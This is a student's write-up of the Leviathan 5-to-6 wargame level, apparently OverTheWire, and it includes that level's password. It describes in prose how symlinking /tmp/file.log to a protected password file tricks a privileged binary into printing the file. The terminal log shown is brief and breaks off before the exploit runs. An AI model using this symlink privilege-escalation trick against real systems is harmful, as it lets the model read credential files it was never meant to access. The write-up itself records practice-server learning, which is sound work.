# Leviathan Level 5 -> 6

**Password:** YZ55XPVk2l

## Solution


So I tried running the given program and it told that it cant find the tmp/file.log. Next step I thought since it currently doesnt exist what if I just create that file with random text in it, in case the program doesnt actually validate the info within that file. So I created that file in a given path and ran the program again and it seems it just prints thats inside the file and deletes the file.log. So I was stuck for a while on this level and spent some time googling what I can do. So apparently since ./leviathan5 is being run through leviathan6 privileges, would it be possible to use the given program linked to the etc/leviathan_pass/ directory to read the contents of the password? Turns out we can actually do something like by using symbolic links, which I remember from the OS course I took when were going over the linux file structure and how they can be used as either a shortcut or read the files. So by creating a symbolic link between the path where the password is located with the tmp/file.log, if we run the leviathan5 program it should read the contents of the password file the same way it was just reading the contents ofthe file.log. To be honest to this Iâ€™m not sure how symbolic links work in linux, I should try reading more about this and that can definetely be an area of vulnerabitlity hackers typically exploit.

cat: /tmp/file.log: No such file or directory
leviathan5@gibson:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@gibson:~$ touch /tmp/file.log ; echo "hello" > /tmp/file.log
leviathan5@gibson:~$ ./leviathan5
